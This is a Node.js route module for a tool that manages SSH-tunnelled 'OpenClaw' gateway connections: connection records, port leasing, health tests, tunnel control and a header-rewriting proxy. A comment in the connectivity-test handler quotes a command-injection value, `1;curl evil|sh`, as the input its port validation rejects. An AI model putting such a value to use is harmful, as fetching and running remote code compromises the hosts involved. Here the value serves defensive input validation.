'use strict';

/**
 * The OpenClaw route family — the connection records (`/api/openclaw/connections`
 * and its `:id`, `version` and `approve-pending` forms), instance-directory
 * detection, the SSH and gateway test, and the tunnel start, status and kill —
 * with the helpers the family and the entry point's proxies share: the port
 * lease, the gateway-host runner, the two port resolvers, the frame-blocker
 * strip, the client-attribution predicate, the two upstream header builders and
 * the project proxy, moved out of `server.js` unchanged (#2248).
 *
 * `register()` registers the routes through the shared kernel, in the order
 * they held in `server.js`; the entry point calls it at the position the
 * routes held, so the route table reads as before. Nothing the handlers use
 * still lives in `server.js`, so `register` takes nothing. The request and
 * upgrade dispatchers stay in `server.js` — they are the entry point's job —
 * and read the six helpers they call from this module's exports; the two
 * header builders keep their place on `server.js`'s own export surface.
 *
 * @module lib/routes/openclaw
 */

const http = require('node:http');
const { createLogger } = require('../logger');
const store = require('../store');
const porthub = require('../porthub');
const tunnel = require('../tunnel');
const openclawApprove = require('../openclaw-approve');
const openclawVersion = require('../openclaw-version');
const openclawDetect = require('../openclaw-detect');
const openclawRemote = require('../openclaw-remote');
const openclawHtml = require('../openclaw-html');
const authSession = require('../auth-session');
const medusa = require('../medusa');
const { route, jsonResponse, errorResponse } = require('./_kernel');

// The logger keeps the entry point's name so every log line this family writes
// reads exactly as it did before the move.
const log = createLogger('server');

/**
 * Lease an OpenClaw connection's port at create/update, and say so when the
 * lease is refused. The route has already asked the machine through
 * `porthub.checkPort`, so a refusal here means the port was taken between that
 * check and this lease; the connection is saved either way and its tunnel will
 * fail to bind, and this warning is what names why.
 * @param {number} port
 * @param {string} leaseName - `oc-direct-<id>`
 * @param {string} service
 * @returns {void}
 */
function _leaseConnectionPort(port, leaseName, service) {
  const result = porthub.registerPort(port, leaseName, service, { permanent: true });
  if (!result.success) {
    log.warn('OpenClaw connection saved without a port lease', {
      port, lease: leaseName, service, code: result.code, error: result.error, listener: result.listener
    });
  }
}

/**
 * Run one command on an OpenClaw gateway host over SSH, capturing stdout,
 * stderr and the exit status separately.
 *
 * The separation is the point (#1076). The previous implementation ran its
 * remote command through `| head -1`, and a pipeline's exit status is its LAST
 * command's — so a `docker` that exited 127 with `No such file or directory`
 * became a successful `head` with empty output, and TangleClaw reported a
 * missing binary as a missing container. Anything built on this seam gets to
 * tell "the command failed" apart from "the command found nothing".
 *
 * `opts.secret`, when given, is redacted from the error text so a gateway token
 * interpolated into the command can never reach a log line.
 *
 * Async: an unreachable gateway host waits out the connect timeout, and a
 * synchronous call would hold the whole server for it.
 *
 * @param {object} conn - OpenClaw connection record (`sshKeyPath`, `sshUser`, `host`).
 * @param {string} command - Command to run on the remote host.
 * @param {object} [opts] - Options.
 * @param {number} [opts.timeoutMs=15000] - Abandon the command after this long.
 * @param {string} [opts.secret] - Value to redact from captured stderr.
 * @returns {Promise<{ok: boolean, stdout: string, stderr: string, code: number}>}
 */
async function _runOnGatewayHost(conn, command, opts = {}) {
  const keyPath = conn.sshKeyPath.replace(/^~/, process.env.HOME || '');
  const timeout = opts.timeoutMs || 15000;
  const redact = (text) => (opts.secret ? String(text).split(opts.secret).join('«token»') : String(text));

  try {
    const { stdout } = await openclawRemote.runFile('ssh', [
      '-o', 'BatchMode=yes', '-o', 'ConnectTimeout=5', '-o', 'StrictHostKeyChecking=no',
      '-i', keyPath, `${conn.sshUser}@${conn.host}`, command
    ], { timeout });
    return { ok: true, stdout: stdout || '', stderr: '', code: 0 };
  } catch (err) {
    // Async execFile reports the exit status as a numeric `code` (the sync form
    // used `status`); anything else — a spawn failure, or our own timeout, whose
    // `code` is null — is not an exit status and maps to -1. The runner has
    // already named a timeout in `stderr`/`message`.
    return {
      ok: false,
      stdout: err.stdout ? String(err.stdout) : '',
      stderr: redact(err.stderr || err.message || ''),
      code: typeof err.code === 'number' ? err.code : -1
    };
  }
}

// ── OpenClaw Proxy ──

/**
 * Resolve the local port for an OpenClaw connection from a project name.
 * @param {string} projectName - Project name
 * @returns {{ localPort: number, conn: object }|null}
 */
function resolveOpenclawPort(projectName) {
  const project = store.projects.getByName(projectName);
  if (!project) return null;
  const engineId = project.engineId;
  if (!engineId || !engineId.startsWith('openclaw:')) return null;
  const connId = engineId.split(':')[1];
  const conn = store.openclawConnections.get(connId);
  if (!conn) return null;
  return { localPort: conn.localPort, conn };
}

/**
 * Resolve the local port for a standalone OpenClaw connection by ID.
 * @param {string} connId - Connection ID
 * @returns {{ localPort: number, conn: object }|null}
 */
function resolveOpenclawPortDirect(connId) {
  const conn = store.openclawConnections.get(connId);
  if (!conn) return null;
  return { localPort: conn.localPort, conn };
}

/**
 * Strip frame-blocking headers from proxied OpenClaw responses so the UI can load in an iframe.
 * @param {object} headers - Response headers from upstream
 * @returns {object}
 */
function _stripFrameBlockers(headers) {
  const out = { ...headers };
  delete out['x-frame-options'];
  if (out['content-security-policy']) {
    out['content-security-policy'] = out['content-security-policy']
      .replace(/frame-ancestors\s+[^;]+;?\s*/g, '');
  }
  return out;
}

/**
 * Is this a header that attributes the request to a client or an earlier hop?
 *
 * Caddy adds `X-Forwarded-*` to everything it fronts. The OpenClaw proxy must not
 * pass them on: TangleClaw is the trust boundary for these requests (it
 * authenticated the operator), the gateway's real peer is the SSH tunnel's
 * loopback end, and OpenClaw 2026.9.x refuses a request carrying them unless the
 * proxy is configured as trusted (`403 proxy_attribution_required`). A prefix
 * rule rather than a list, so any `X-Forwarded-*` a front end adds is covered.
 * Shared by the HTTP and WebSocket builders so the two cannot drift apart.
 * @param {string} name - Header name, any letter case.
 * @returns {boolean}
 */
function _isClientAttributionHeader(name) {
  const k = String(name).toLowerCase();
  return k === 'forwarded' || k === 'x-real-ip' || k.startsWith('x-forwarded-');
}

/**
 * Build proxy headers for OpenClaw requests, rewriting origin/referer to match the target
 * and injecting the gateway token for server-side auth.
 * @param {object} headers - Original request headers
 * @param {number} localPort - Target local port
 * @param {string|null} [gatewayToken] - Gateway bearer token
 * @returns {object}
 */
function _openclawProxyHeaders(headers, localPort, gatewayToken) {
  // Same rule as the Authorization strip below, for the same reason and one
  // chunk later: TangleClaw's session cookie is ours and the gateway — which
  // may be a REMOTE host at the far end of a tunnel — has no use for it
  // (ADR 0016 OQ1). Only our two cookies are removed; the gateway sets its own
  // through this proxy and those must survive.
  const out = { ...authSession.stripOwnCookiesFromHeaders(headers), host: `127.0.0.1:${localPort}` };
  for (const key of Object.keys(out)) {
    if (_isClientAttributionHeader(key)) delete out[key];
  }
  const localOrigin = `http://127.0.0.1:${localPort}`;
  if (out.origin) out.origin = localOrigin;
  if (out.referer) out.referer = localOrigin + '/';
  // The OpenClaw gateway authenticates via the injected gateway token, never the
  // browser's Authorization header — in caddy-gated ingress mode that header is the
  // operator's Basic credential, meaningless to the gateway and not to be leaked to
  // the downstream host. Always strip the incoming header, then set Bearer only when
  // a token is configured (#470).
  delete out.authorization;
  if (gatewayToken) out.authorization = `Bearer ${gatewayToken}`;
  return out;
}

/**
 * Build the raw HTTP/1.1 request line + header block for a proxied OpenClaw
 * WebSocket handshake. The WS upgrade path writes headers to a socket by hand
 * rather than through `http.request`, so this is the WS-side mirror of
 * {@link _openclawProxyHeaders} and MUST apply the same Authorization rule (#470):
 * the incoming `Authorization` header (the operator's caddy Basic credential in
 * gated mode) is always dropped, and a `Bearer <gatewayToken>` is injected when a
 * token is configured. `Host` is pinned to the upstream and `Origin`/`Referer` are
 * rewritten to the local origin, and client-attribution headers are dropped
 * ({@link _isClientAttributionHeader}). TangleClaw's own session and CSRF cookies are
 * stripped, as on HTTP (ADR 0016 OQ1). Terminates with the blank line ending the block.
 * @param {object} headers - Incoming request headers (`req.headers`, lowercased keys).
 * @param {string} targetUrl - Rewritten request target for the upstream.
 * @param {number} localPort - Upstream tunnel port on 127.0.0.1.
 * @param {string|null} [gatewayToken] - Gateway bearer token, or null/undefined.
 * @returns {string[]} Lines to `.join('\r\n')` before writing to the proxy socket.
 */
function _openclawWsRequestLines(headers, targetUrl, localPort, gatewayToken) {
  const localOrigin = `http://127.0.0.1:${localPort}`;
  const lines = [`GET ${targetUrl} HTTP/1.1`, `Host: 127.0.0.1:${localPort}`];
  // TangleClaw's session and CSRF cookies are ours, and the gateway — possibly a
  // remote host at the far end of a tunnel — has no use for them (ADR 0016 OQ1).
  // Same rule as `_openclawProxyHeaders` on HTTP; the gateway's own cookies
  // survive.
  for (const [key, value] of Object.entries(authSession.stripOwnCookiesFromHeaders(headers))) {
    const k = key.toLowerCase();
    if (k === 'host') continue;
    if (_isClientAttributionHeader(k)) continue; // same rule as the HTTP builder
    if (k === 'authorization') continue; // stripped; gateway token injected below (#470)
    if (k === 'origin') { lines.push(`origin: ${localOrigin}`); continue; }
    if (k === 'referer') { lines.push(`referer: ${localOrigin}/`); continue; }
    lines.push(`${key}: ${value}`);
  }
  if (gatewayToken) lines.push(`authorization: Bearer ${gatewayToken}`);
  lines.push('', '');
  return lines;
}

/**
 * Proxy an HTTP request to an OpenClaw instance via its local tunnel port.
 * @param {http.IncomingMessage} req
 * @param {http.ServerResponse} res
 * @param {string} projectName - Project name from URL
 * @param {string} subPath - Remaining path after /openclaw/:project/
 */
function proxyToOpenclaw(req, res, projectName, subPath) {
  const resolved = resolveOpenclawPort(projectName);
  if (!resolved) {
    return errorResponse(res, 404, 'OpenClaw connection not found for project', 'NOT_FOUND');
  }

  const { localPort } = resolved;
  const targetPath = '/' + subPath + (req.url.includes('?') ? '?' + req.url.split('?')[1] : '');

  const proxyReq = http.request({
    hostname: '127.0.0.1',
    port: localPort,
    path: targetPath,
    method: req.method,
    headers: _openclawProxyHeaders(req.headers, localPort, resolved.conn.gatewayToken)
  }, (proxyRes) => {
    openclawHtml.relayOpenclawResponse(req, res, proxyRes, _stripFrameBlockers(proxyRes.headers),
      `/openclaw/${encodeURIComponent(projectName)}`, log);
  });

  proxyReq.on('error', (err) => {
    log.warn('OpenClaw proxy error', { error: err.message, project: projectName });
    errorResponse(res, 502, 'OpenClaw service unavailable', 'BAD_GATEWAY');
  });

  req.pipe(proxyReq);
}

/**
 * Register the OpenClaw routes on the shared route table.
 * @returns {void}
 */
function register() {
  // GET /api/openclaw/connections
  route('GET', '/api/openclaw/connections', (_req, res) => {
    const connections = store.openclawConnections.list();
    jsonResponse(res, 200, { connections });
  });

  // POST /api/openclaw/connections
  route('POST', '/api/openclaw/connections', (_req, res, _params, body) => {
    if (!body || !body.name || !body.host || !body.sshUser || !body.sshKeyPath) {
      return errorResponse(res, 400, 'name, host, sshUser, and sshKeyPath are required', 'BAD_REQUEST');
    }
    // Resolve the tunnel local_port. An explicit port is conflict-checked and
    // used verbatim; when omitted, PortHub auto-allocates the first free port so
    // a second connection can't silently collide on the legacy 18789 default (#352).
    if (body.localPort) {
      const portCheck = porthub.checkPort(body.localPort);
      if (!portCheck.available) {
        return errorResponse(res, 409, `Port ${body.localPort} is already in use by ${portCheck.leasedBy || 'system process'}`, 'PORT_CONFLICT');
      }
    } else {
      try {
        body.localPort = porthub.nextFreePort({ range: [18789, 18999] });
      } catch (err) {
        return errorResponse(res, 409, err.message, 'PORT_EXHAUSTED');
      }
    }
    // Resolve bridge_port. NULL-by-default is load-bearing: a non-null bridge_port
    // emits an extra `-L` SSH forward that breaks non-ClawBridge tunnels (#160), so
    // we only auto-allocate when the caller explicitly opts in with the 'auto'
    // sentinel. An explicit number is conflict-checked; anything else stays null.
    if (body.bridgePort === 'auto') {
      try {
        body.bridgePort = porthub.nextFreePort({ range: [3201, 3300] });
      } catch (err) {
        return errorResponse(res, 409, err.message, 'PORT_EXHAUSTED');
      }
    } else if (body.bridgePort !== undefined && body.bridgePort !== null && body.bridgePort !== '') {
      const bridgeCheck = porthub.checkPort(body.bridgePort);
      if (!bridgeCheck.available) {
        return errorResponse(res, 409, `Bridge port ${body.bridgePort} is already in use by ${bridgeCheck.leasedBy || 'system process'}`, 'PORT_CONFLICT');
      }
    }
    try {
      const connection = store.openclawConnections.create(body);
      // Lease-at-create: reserve the resolved port(s) under the connection's tunnel
      // identity so a subsequent add picks a different port even before the tunnel
      // comes up (closing the allocate→bind race). Released on DELETE.
      // No `adoptListener`: the tunnel does not exist yet, so a listener here
      // would be a stranger's. `checkPort`/`nextFreePort` above already asked
      // the machine, so this lease normally finds the port clear.
      const leaseName = `oc-direct-${connection.id}`;
      _leaseConnectionPort(connection.localPort, leaseName, 'openclaw-tunnel');
      if (connection.bridgePort) {
        _leaseConnectionPort(connection.bridgePort, leaseName, 'openclaw-bridge');
      }
      jsonResponse(res, 201, connection);
    } catch (err) {
      if (err.code === 'CONFLICT') {
        return errorResponse(res, 409, err.message, 'CONFLICT');
      }
      if (err.code === 'BAD_REQUEST') {
        return errorResponse(res, 400, err.message, 'BAD_REQUEST');
      }
      throw err;
    }
  });

  // GET /api/openclaw/connections/:id
  route('GET', '/api/openclaw/connections/:id', (_req, res, params) => {
    const connection = store.openclawConnections.get(params.id);
    if (!connection) {
      return errorResponse(res, 404, `Connection "${params.id}" not found`, 'NOT_FOUND');
    }
    jsonResponse(res, 200, connection);
  });

  // GET /api/openclaw/connections/:id/version — OpenClaw instance version (#296).
  // Reads the pinned image tag from the instance's .env over SSH (cached). Needs
  // the connection's `instanceDir` set; returns version:null + a reason otherwise.
  route('GET', '/api/openclaw/connections/:id/version', async (req, res, params) => {
    const conn = store.openclawConnections.get(params.id);
    if (!conn) {
      return errorResponse(res, 404, `Connection "${params.id}" not found`, 'NOT_FOUND');
    }
    const force = /[?&]force=(1|true)\b/.test(req.url || '');
    const result = await openclawVersion.fetchVersion(conn, { force });
    jsonResponse(res, 200, { version: result.version, cached: !!result.cached, error: result.error });
  });

  // POST /api/openclaw/detect-instance-dir — auto-discover candidate instanceDir
  // values over SSH (#306-followup). Stateless: takes the SSH-target fields in
  // the body so it works from the Add form before the connection exists.
  route('POST', '/api/openclaw/detect-instance-dir', async (_req, res, _params, body) => {
    if (!body || typeof body !== 'object') {
      return errorResponse(res, 400, 'Request body must be a JSON object', 'BAD_REQUEST');
    }
    const { host, sshUser, sshKeyPath } = body;
    const result = await openclawDetect.detectInstanceDir({ host, sshUser, sshKeyPath });
    jsonResponse(res, 200, { dirs: result.dirs, error: result.error });
  });

  // PUT /api/openclaw/connections/:id
  route('PUT', '/api/openclaw/connections/:id', (_req, res, params, body) => {
    if (!body || typeof body !== 'object') {
      return errorResponse(res, 400, 'Request body must be a JSON object', 'BAD_REQUEST');
    }
    const existing = store.openclawConnections.get(params.id);
    if (!existing) {
      return errorResponse(res, 404, `Connection "${params.id}" not found`, 'NOT_FOUND');
    }
    // Check for port conflicts if localPort is being changed
    if (body.localPort !== undefined && body.localPort !== existing.localPort) {
      const portCheck = porthub.checkPort(body.localPort);
      if (!portCheck.available) {
        return errorResponse(res, 409, `Port ${body.localPort} is already in use by ${portCheck.leasedBy || 'system process'}`, 'PORT_CONFLICT');
      }
    }
    // Resolve bridgePort the same way POST does (#483). 'auto' is idempotent on
    // update: a connection that already has a bridge port keeps it (re-saving an
    // edit form must not churn ports); only a bridge-less connection allocates.
    if (body.bridgePort === 'auto') {
      if (existing.bridgePort) {
        body.bridgePort = existing.bridgePort;
      } else {
        try {
          body.bridgePort = porthub.nextFreePort({ range: [3201, 3300] });
        } catch (err) {
          return errorResponse(res, 409, err.message, 'PORT_EXHAUSTED');
        }
      }
    } else if (body.bridgePort !== undefined && body.bridgePort !== null && body.bridgePort !== ''
        && body.bridgePort !== existing.bridgePort) {
      const bridgeCheck = porthub.checkPort(body.bridgePort);
      if (!bridgeCheck.available) {
        return errorResponse(res, 409, `Bridge port ${body.bridgePort} is already in use by ${bridgeCheck.leasedBy || 'system process'}`, 'PORT_CONFLICT');
      }
    }
    try {
      const connection = store.openclawConnections.update(params.id, body);
      // Lease reconciliation (#483): the create path leases local/bridge ports
      // under oc-direct-<id> and DELETE releases them, but a port change via PUT
      // used to leave the old lease held forever and the new port unleased —
      // reopening the #352 allocate→bind race for edited connections. Mirror the
      // create/delete lifecycle: kill the now-misconfigured standalone tunnel
      // (killTunnel also releases its tracked localPort), release the stale
      // leases, then re-lease the connection's current ports.
      const localChanged = connection.localPort !== existing.localPort;
      const bridgeChanged = connection.bridgePort !== existing.bridgePort;
      if (localChanged || bridgeChanged) {
        const leaseName = `oc-direct-${connection.id}`;
        tunnel.killTunnel(leaseName);
        if (localChanged && existing.localPort) {
          porthub.releasePort(existing.localPort);
        }
        if (bridgeChanged && existing.bridgePort) {
          porthub.releasePort(existing.bridgePort);
        }
        // Not adopted, as at create: the old tunnel was just killed and the new
        // one is not up, so a listener on the new port is a stranger's.
        if (connection.localPort) {
          _leaseConnectionPort(connection.localPort, leaseName, 'openclaw-tunnel');
        }
        if (connection.bridgePort) {
          _leaseConnectionPort(connection.bridgePort, leaseName, 'openclaw-bridge');
        }
      }
      openclawVersion.invalidate(params.id); // #296: instanceDir may have changed → drop stale cache
      jsonResponse(res, 200, connection);
    } catch (err) {
      if (err.code === 'NOT_FOUND') {
        return errorResponse(res, 404, err.message, 'NOT_FOUND');
      }
      if (err.code === 'CONFLICT') {
        return errorResponse(res, 409, err.message, 'CONFLICT');
      }
      if (err.code === 'BAD_REQUEST') {
        return errorResponse(res, 400, err.message, 'BAD_REQUEST');
      }
      throw err;
    }
  });

  // DELETE /api/openclaw/connections/:id
  route('DELETE', '/api/openclaw/connections/:id', (_req, res, params) => {
    try {
      // Kill any active standalone tunnel and release port before deleting
      const conn = store.openclawConnections.get(params.id);
      if (conn) {
        tunnel.killTunnel(`oc-direct-${conn.id}`);
        if (conn.localPort) {
          porthub.releasePort(conn.localPort);
        }
        if (conn.bridgePort) {
          porthub.releasePort(conn.bridgePort);
        }
      }
      store.openclawConnections.delete(params.id);
      openclawVersion.invalidate(params.id); // #296: drop any cached version for the deleted connection
      jsonResponse(res, 200, { ok: true, id: params.id });
    } catch (err) {
      if (err.code === 'NOT_FOUND') {
        return errorResponse(res, 404, err.message, 'NOT_FOUND');
      }
      throw err;
    }
  });

  // POST /api/openclaw/test — Test SSH connectivity + gateway health
  route('POST', '/api/openclaw/test', async (_req, res, _params, body) => {
    if (!body || !body.host || !body.sshUser || !body.sshKeyPath) {
      return errorResponse(res, 400, 'host, sshUser, and sshKeyPath are required', 'BAD_REQUEST');
    }
    // #312: these fields are interpolated into an `ssh ...` shell command below,
    // so shape-validate them (reusing the detect endpoint's guards — one source
    // of truth) before any shell-out. Rejects `;`, `$(...)`, backticks, etc.
    const unsafe = openclawDetect.unsafeReason({
      host: body.host,
      sshUser: body.sshUser,
      sshKeyPath: body.sshKeyPath
    });
    if (unsafe) {
      return errorResponse(res, 400, unsafe, 'BAD_REQUEST');
    }
    // #312: `port`/`localPort` are interpolated into the `curl …:<port>/healthz`
    // shell command below, so they must be plain integers in range — reject
    // anything else (e.g. `localPort = "1;curl evil|sh"`) before shelling out.
    for (const [name, val] of [['port', body.port], ['localPort', body.localPort]]) {
      if (val === undefined || val === null || val === '') continue;
      const n = Number(val);
      if (!Number.isInteger(n) || n < 1 || n > 65535) {
        return errorResponse(res, 400, `${name} must be an integer between 1 and 65535`, 'BAD_REQUEST');
      }
    }

    const keyPath = body.sshKeyPath.replace(/^~/, process.env.HOME || '');
    const port = body.port || 18789;
    const host = body.host;
    const sshUser = body.sshUser;

    // Test SSH connectivity with a short timeout. Both probes run off the event
    // loop: a host that does not answer waits out the whole timeout.
    const results = { ssh: false, gateway: false, errors: [] };

    try {
      await openclawRemote.runShell(
        `ssh -o BatchMode=yes -o ConnectTimeout=5 -o StrictHostKeyChecking=accept-new -i "${keyPath}" ${sshUser}@${host} "echo ok"`,
        { timeout: 10000 }
      );
      results.ssh = true;
    } catch (err) {
      results.errors.push(`SSH: ${err.stderr || err.message}`);
    }

    // Test gateway health if a localPort or port is provided
    if (body.localPort || port) {
      const testPort = body.localPort || port;
      try {
        const { stdout: output } = await openclawRemote.runShell(
          `curl -s -m 5 http://localhost:${testPort}/healthz`,
          { timeout: 10000 }
        );
        try {
          const parsed = JSON.parse(output);
          results.gateway = !!parsed.ok;
        } catch {
          results.gateway = false;
          results.errors.push(`Gateway: unexpected response: ${output.slice(0, 200)}`);
        }
      } catch (err) {
        results.errors.push(`Gateway: ${err.stderr || err.message}`);
      }
    }

    jsonResponse(res, 200, results);
  });

  // POST /api/openclaw/connections/:id/tunnel — Start tunnel for standalone access
  route('POST', '/api/openclaw/connections/:id/tunnel', async (_req, res, params, body) => {
    const conn = store.openclawConnections.get(params.id);
    if (!conn) {
      return errorResponse(res, 404, `Connection "${params.id}" not found`, 'NOT_FOUND');
    }

    const extraForwards = conn.bridgePort ? [{ localPort: conn.bridgePort, remotePort: conn.bridgePort }] : [];
    const tunnelResult = await tunnel.ensureTunnel(`oc-direct-${conn.id}`, {
      host: conn.host,
      port: conn.port,
      localPort: conn.localPort,
      sshUser: conn.sshUser,
      sshKeyPath: conn.sshKeyPath,
      force: body && body.force === true,
      extraForwards
    });

    if (!tunnelResult.ok) {
      return errorResponse(res, 502, `Tunnel failed: ${tunnelResult.error}`, 'TUNNEL_ERROR');
    }

    const tokenParam = conn.gatewayToken ? `#token=${encodeURIComponent(conn.gatewayToken)}` : '';
    // Proxy through TangleClaw so remote browsers can reach the tunnel on the TangleClaw host
    const webuiUrl = `/openclaw-direct/${encodeURIComponent(conn.id)}/chat?session=main${tokenParam}`;

    jsonResponse(res, 200, {
      ok: true,
      alreadyUp: tunnelResult.alreadyUp,
      webuiUrl,
      localPort: conn.localPort
    });
  });

  // GET /api/openclaw/connections/:id/tunnel — Get tunnel status for a connection
  route('GET', '/api/openclaw/connections/:id/tunnel', async (_req, res, params) => {
    const conn = store.openclawConnections.get(params.id);
    if (!conn) {
      return errorResponse(res, 404, `Connection "${params.id}" not found`, 'NOT_FOUND');
    }

    const status = await tunnel.detectTunnel(conn.localPort, conn.host);
    const tracked = tunnel.getTunnel(`oc-direct-${conn.id}`);

    jsonResponse(res, 200, {
      localPort: conn.localPort,
      host: conn.host,
      active: status.active,
      connectable: status.connectable,
      pid: status.pid,
      tracked: !!tracked
    });
  });

  // DELETE /api/openclaw/connections/:id/tunnel — Kill tunnel for a connection
  route('DELETE', '/api/openclaw/connections/:id/tunnel', async (_req, res, params) => {
    const conn = store.openclawConnections.get(params.id);
    if (!conn) {
      return errorResponse(res, 404, `Connection "${params.id}" not found`, 'NOT_FOUND');
    }

    // Try tracked kill first, then fall back to port-based kill
    const tracked = tunnel.killTunnel(`oc-direct-${conn.id}`);
    const byPort = await tunnel.killTunnelByPort(conn.localPort, conn.host);

    // Also kill any project-scoped tunnels using this connection's port
    const projectTunnels = tunnel.listTunnels().filter(t => t.localPort === conn.localPort);
    for (const t of projectTunnels) {
      tunnel.killTunnel(t.projectName);
    }

    // Mark any active webui sessions using this connection as killed
    const connections = store.openclawConnections.list();
    const thisConn = connections.find(c => c.id === params.id);
    if (thisConn) {
      const projects = store.projects.list();
      for (const proj of projects) {
        if (proj.engineId === `openclaw:${params.id}`) {
          const active = store.sessions.getActive(proj.id);
          if (active && active.sessionMode === 'webui') {
            store.sessions.kill(active.id, 'Tunnel killed from connection panel');
            // Forget the killed session's Medusa listener + id (MED-2K9P Chunk 04)
            // so a tunnel-killed webui session doesn't strand a ghost roster peer.
            medusa.forgetSession({ projectPath: proj.path, sessionId: active.id });
          }
        }
      }
    }

    // #288: report whether the port was actually freed — the old route returned
    // ok:true unconditionally, hiding the exact zombie-survives-kill case this
    // fix exists to surface. `released:false` means the operator still has a
    // stuck tunnel and should escalate (manual kill), not assume recovery.
    jsonResponse(res, 200, {
      ok: byPort.released !== false,
      killedPid: byPort.pid,
      released: byPort.released,
      error: byPort.error || null,
      localPort: conn.localPort
    });
  });

  // POST /api/openclaw/connections/:id/approve-pending — Auto-approve pending device pairing.
  // Every outcome carries a machine-readable `code` alongside the human `reason`
  // (#1076): the UI needs to tell "docker is missing on the host" from "there is
  // nothing pending", and the previous single `reason` string conflated a failed
  // command with an absent container.
  route('POST', '/api/openclaw/connections/:id/approve-pending', async (_req, res, params) => {
    const conn = store.openclawConnections.get(params.id);
    if (!conn) {
      return errorResponse(res, 404, `Connection "${params.id}" not found`, 'NOT_FOUND');
    }

    if (!conn.gatewayToken) {
      return errorResponse(res, 400, 'No gateway token configured — cannot approve pairing', 'BAD_REQUEST');
    }

    const result = await openclawApprove.approvePending({
      runRemote: (command, opts) => _runOnGatewayHost(conn, command, opts),
      port: conn.port,
      gatewayToken: conn.gatewayToken
    });

    if (result.approved) {
      log.info('Auto-approved device pairing', {
        connection: conn.name, pendingCount: result.count, dockerBin: result.dockerBin
      });
    } else {
      log.warn('Auto-approve did not approve', {
        connection: conn.name, code: result.code, reason: result.reason
      });
    }

    return jsonResponse(res, 200, {
      approved: result.approved,
      code: result.code,
      reason: result.reason,
      count: result.count
    });
  });
}

module.exports = {
  register,
  resolveOpenclawPort,
  resolveOpenclawPortDirect,
  _stripFrameBlockers,
  _openclawProxyHeaders,
  _openclawWsRequestLines,
  proxyToOpenclaw
};
